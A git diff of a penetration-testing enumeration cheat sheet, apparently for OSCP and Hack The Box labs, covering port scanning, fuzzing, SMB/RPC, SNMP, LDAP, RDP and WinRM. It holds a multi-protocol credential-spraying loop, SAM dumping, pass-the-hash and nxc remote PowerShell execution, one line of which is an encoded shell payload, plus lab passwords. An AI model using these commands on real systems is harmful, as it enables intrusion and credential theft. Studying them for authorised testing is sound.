@@ -14,13 +14,22 @@ description: All but the easiest HTBs are harder than even the 25 point exam box
 
 {% embed url="https://github.com/oncybersec/oscp-enumeration-cheat-sheet" %}
 
+#### IP Sweeping (Use for ports too)
+
+```
+for i in {1..255} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+```
+
 ### Nmap
 
 ```
-sudo nmap -v $ip -sC -sV -p- --open -oN tcpscan.nmap (TCP)
+TCP
+sudo nmap -v $ip -sC -sV -p- --open -oN tcpscan.nmap 
 sudo nmap -sVC -vvv $ip --script vuln -oN fulltcpscan.nmap (Scan vulnerabilities eg. SMB)
 
-sudo nmap -sU --top-ports 20 -oN udpscan.nmap -vv $ip  (UDP)
+UDP
+sudo nmap -sU --top-ports 20 -oN udpscan.nmap -vv $ip 
+
 -Pn Disables host discovery and only conducts a port scan. 
 -A OS/Version Detection
 -O Remote OS detection using TCP/IP stack fingerprinting
@@ -34,18 +43,19 @@ sudo nmap -sU --top-ports 20 -oN udpscan.nmap -vv $ip  (UDP)
 Always look up documentation of service you're trying to exploit, 90% of the time the answer will be there if you feel all other vectors are off
 {% endhint %}
 
-<pre data-title="Fuzzing with ffuf"><code>(VHost)     ffuf -w /usr/share/wordlists/bitquark-subdomains-top100000.txt -u http://$IP:PORT -H 'Host: FUZZ.board.htb' -f(c/s/w)   
+### Ffuf
+
+<pre><code>(VHost)     ffuf -w /usr/share/wordlists/bitquark-subdomains-top100000.txt -u http://$IP:PORT -H 'Host: FUZZ.board.htb' -f(c/s/w)   
 (Directory) ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP:PORT/FUZZ 
-(File fuzzing) -e .php,.html,.txt            
+(File extension fuzzing) -e .php,.html,.txt            
 (HTTP POST) ffuf -w [wordlist] -u [URL] -X POST -d '<a data-footnote-ref href="#user-content-fn-1">id=FUZZ</a>' -H 'header: value' -fs xxx  
 (Use raw request) : ffuf -request request.txt -request-proto http -w wordlist.txt -r [FUZZ should be present in the request]
 (Multiple params) ffuf -w list1.txt:W1 -w list2.txt:W2 -X POST -d "username=W1&#x26;password=W2" -u [URL] -fc 200
+
+Extra flags
 -p "1.0" and -rate [25]  to rate limit incase of WAF
 -r follow redirect
 -recursion
-wfuzz -c -w /usr/share/wordlists/yes.txt -u "http://alert.htb/" -H "Host: FUZZ.alert.htb"
-
-nikto -h $ip
 </code></pre>
 
 #### Send web request via cURL
@@ -61,6 +71,20 @@ sudo wpscan --url http://[URL]
 sudo wpscan --url http://[URL] -e ap --plugins-detection aggressive
 ```
 
+Alt (wfuzz)
+
+```
+wfuzz -c -w /usr/share/wordlists/yes.txt -u "http://alert.htb/" -H "Host: FUZZ.alert.htb"
+```
+
+Real life pentests
+
+```
+nikto -h $ip
+```
+
+
+
 #### WebDAV
 
 {% embed url="https://www.linkedin.com/pulse/exploiting-webdav-gainrce-arav-budhiraja/" %}
@@ -75,7 +99,12 @@ cadaver go crazy (ASP revshell)
 * File upload
 
 ```
+Default path usually /var/ftp/
+```
+
+```
 wget -r ftp://anonymous:@<IP>    [If you can't see anything or don't really know where you are]
+
 ftp [ip]
 passive (Mitigate entering passive mode)
 dir
@@ -95,10 +124,11 @@ ssh -L [kali_port]:localhost:[target_port] [user]@[ip] -fN
 chmod 600 id_dsa
 port forwarding (local and remote)
 sshuttle
-proxychains?
 ```
 
 ### SMTP (25) and Mail
+
+**Always check** `/var/mail/` **and** `/var/spool/mail`
 
 ```
 telnet 10.10.11.14 25
@@ -159,34 +189,61 @@ QUIT
 ### DNS (53)
 
 ```
-dig axfr hutch.offsec @192.168.223.122
+dig axfr $fqdn @$ip
 ```
 
 ### SMB & RPC (139/445)
 
+#### NXC
+
 ```
-NXC
 nxc smb [ip]
 nxc smb 10.10.11.35 -u userlist.txt -p 'password' [bruteforce usernames, change smb to winrm/ldap or any other protocol you want to test perms for]
 nxc smb $ip -u guest -p '' --shares [list shares depending on user access provided]
 nxc smb [host] -u [user] -p [password] --sam
-nxc smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
+nxc smb 10.10.10.10 -u Username -p Password -X 'powershell -e [shell]'
+nxc winrm ./targets.txt -d medtech.com -u wario -p 'Mushroom!' [domain users, --local-auth otherwise]] 
+nxc smb 192.168.209.159 -u guest -p '' -M spider_plus -o DOWNLOAD_FLAG=True [Download all files available]
+```
 
-SMBCLIENT [INTERACT WITH SMB]
+**Other NXC perks**
+
+**Spray across all protocols**
+
+```
+for p in {ftp,mssql,rdp,wmi,ldap,smb,winrm}; do nxc $p ips.txt -u users.txt -H hashes.txt [--no-bruteforce] ; done 2>/dev/null
+```
+
+**ADCS**
+
+```
+nxc ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
+```
+
+#### SMBClient
+
+```
 smbclient //[ip]/[share] -N -L [List share with null auth]
 smbclient -L //[ip] -U [user]
 smbclient --user username //10.10.11.35/DEV
+smbclient -U 'feast.com\\Eric.Wallows' //MS01.feast.com/Apps
 recurse ON
 prompt OFF
 mget *
 smbclient.py '[domain]/[user]:[pass]@[ip/host] -k -no-pass [Kerberos auth]
+```
 
-SMBMAP
+#### SMBmap
+
+```
 smbmap -H [ip] -u user -p 'password' -r SYSVOL --depth 10
 smbmap -H [ip] --download PATH_TO_FILE
+```
 
-RPCCLIENT
-rpcclient -U '' -N 10.10.11.35   
+#### RPCClient
+
+```
+rpcclient -U '' [-N/--pw-nt-hash (val)] 10.10.11.35   
 rpcclient -U 'user'  10.10.11.35
 enumdomusers
 enumdomgroups
@@ -194,15 +251,6 @@ querydispinfo (less info about all users)
 querygroup [RID]
 queryuser [RID]
 enumprivs
-
-MOUNT
-#First create folder in kali linux 
-mkdir /mnt/smb
-#mount folder to kali
-sudo mount -t cifs //[IP]/[SHARE] /mnt/smb
-
-responder to receive NTLM authentication hashes from services like mysql
-smbserver.py
 ```
 
 #### User Enumeration
@@ -212,9 +260,29 @@ smbserver.py
 netexec smb [ip] -u guest -p '' --[rid-brute/users/groups/local-users]
 </code></pre>
 
+#### Mount Shares
+
+```
+#First create folder in kali linux 
+mkdir /mnt/smb
+#mount folder to kali
+sudo mount -t cifs //[IP]/[SHARE] /mnt/smb
+```
+
 {% embed url="https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html" %}
 
 {% embed url="https://www.hackingarticles.in/active-directory-enumeration-rpcclient/" %}
+
+### SNMP (161)
+
+<pre><code>snmpwalk -v2c -c public 192.168.244.156 -m all
+<strong>snmpwalk -v 2c -c public 192.168.xxx.156 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+</strong>onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt &#x3C;IP>
+snmpbulkwalk -c &#x3C;COMMUNITY_STRING> -v&#x3C;VERSION> &#x3C;IP>
+snmp-check &#x3C;IP>
+
+nmap --script "snmp* and not snmp-brute" &#x3C;target>
+</code></pre>
 
 ### LDAP (389)&#x20;
 
@@ -241,5 +309,43 @@ nxc ldap 10.10.10.10 -u '' -p '' --password-not-required --admin-count --users -
 {% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap" %}
 
 {% embed url="https://web.archive.org/web/20200309204648/http://0daysecurity.com/penetration-testing/enumeration.html" %}
+
+### RDP (3389)
+
+```
+xfreerdp /v:ip_address /u:username /p:password /cert:ignore +clipboard
+xfreerdp /u:THM\phillip /p:Claire2008 /v:10.10.225.26 /dynamic-resolution
+Username format : THM\philip [even tho in the login it shows <room name>\<username>, fix it]
+/pth:[hash]
+/drive:path/to/directory,share_name
+https://commandmasters.com/commands/xfreerdp-linux/
++enforce-tls2, /cert-ignore, tls-seclevel
+
+rdesktop -d [domain] -u [username] -p [password] [host]
+WORKED
+xfreerdp /d:MEDTECH /u:yoshi /p:'Mushroom!' /v:DEV04.medtech.com /dynamic-resolution /cert:ignore [/sec:nla]
+```
+
+> I just dealt with Nla and credssp errors in lab. Banging my head against the wall and then accidently left off the -d domain name and it worked. It logged in as domain user and I'm not sure how but that was xfreerdp. I didn't try the fix with rdesktop. I just moved on
+
+### WinRM (5985)
+
+{% hint style="info" %}
+Timelapse \[HTB AD]
+{% endhint %}
+
+Logging via certificates and SSL (-S)
+
+```
+evil-winrm -i timelapse.htb -S -c certificate.crt -k yourkey_dec.pem
+```
+
+### Redis (6379)
+
+{% hint style="info" %}
+Blackgate and Readys \[PG Linux]
+{% endhint %}
+
+{% embed url="https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html" %}
 
 [^1]: FUZZ=key if you wanna do the opposite
